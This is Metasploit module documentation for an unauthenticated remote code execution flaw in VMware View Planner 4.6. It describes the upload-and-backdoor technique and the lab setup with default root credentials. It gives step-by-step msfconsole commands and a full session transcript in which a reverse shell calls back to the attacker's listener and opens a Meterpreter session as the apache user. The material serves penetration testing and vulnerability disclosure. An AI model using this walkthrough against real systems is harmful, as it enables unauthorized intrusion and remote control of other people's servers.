## Vulnerable Application
VMWare View Planner 4.6 prior to 4.6 Security Patch 1 contained an log file upload script,
named `log_upload_wsgi.py`, which was mapped on to the web page `/logupload` and available
to unauthenticated users. Furthermore, unauthenticated users could browse the source code of
this file by navigating to `/wsgi_log_upload/log_upload_wsgi.py`, giving them an easy way to
ensure that they restored the original contents of the `log_upload_wsgi.py` file.

The module takes advantage of these two properties to first obtain the contents of the
`log_upload_wsgi.py` file and then overwrite it with a backdoored copy. Once a request has been
sent to `/logupload` to trigger the payload, the original copy of `log_upload_wsgi.py` is then
restored to ensure the target can continue its normal operations. Successful exploitation results
in RCE as the `apache` user within the `appacheServer` Docker container.

### Setup Steps

1. Sign up for an account at https://my.vmware.com/web/vmware/registration
1. Browse to https://my.vmware.com/web/vmware/downloads/details?downloadGroup=VIEW-PLAN-460&productId=1067&rPId=53394 and download the OVA file for View Planner Harness.
1. Verify the name of the downloaded OVA is viewplanner-harness-4.6.0.0-16995088_OVF10.ova and its hash is 4639f1916ffd30095cf5af383f38f7de
1. Install the VM and boot it up. When you get to the main screen, which will take several minutes, select Login with the arrow keys and log in with the username `root` and password `changeme`.
1. Run `~/viewplanner/setup/harness_first_boot.sh` to start the server.
1. Verify that the web server is accessible over port 80 or 443 and that the page at `/logupload` is accessible.

## Verification Steps

1. Install the server
1. Start msfconsole
1. Do: `use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce`
1. Do: `set rhosts [Target IP]`
1. Do: `set lhost [Local IP]`
1. Do: `exploit`
1. You should get a shell as the `apache` user on the target machine.
1. You should also see that the original copy of `log_upload_wsgi.py` is restored after you get a shell.

## Options

## Scenarios

### VMWare View Planner 4.6.0.0 OVA (viewplanner-harness-4.6.0.0-16995088_OVF10.ova)

```
msf6 > use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/vmware_view_planner_4_6_uploadlog_rce) > set RHOSTS 172.18.51.76
RHOSTS => 172.18.51.76
msf6 exploit(linux/http/vmware_view_planner_4_6_uploadlog_rce) > set LHOST 172.18.54.135
LHOST => 172.18.54.135
msf6 exploit(linux/http/vmware_view_planner_4_6_uploadlog_rce) > show options

Module options (exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.18.51.76     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.54.135    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   VMware View Planner 4.6.0

msf6 exploit(linux/http/vmware_view_planner_4_6_uploadlog_rce) > exploit

[*] Started reverse TCP handler on 172.18.54.135:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Vulnerable log_upload_wsgi.py file identified!
[*] Uploading backdoor to system via the arbitrary file upload vulnerability!
[+] Backdoor uploaded!
[*] Sending request to execute the backdoor!
[*] Sending stage (39344 bytes) to 172.18.51.76
[*] Reuploading the original code to remove the backdoor!
[+] Original file restored, enjoy the shell!
[*] Meterpreter session 2 opened (172.18.54.135:4444 -> 172.18.51.76:53278) at 2021-03-10 16:34:37 -0600

meterpreter > getuid
Server username: apache
meterpreter > sysinfo
Computer     : cf49e2261af4
OS           : Linux 4.9.137-1.ph2 #1-photon SMP Tue Nov 20 14:26:55 UTC 2018
Architecture : x64
Meterpreter  : python/linux
meterpreter > pwd
/
meterpreter >
```
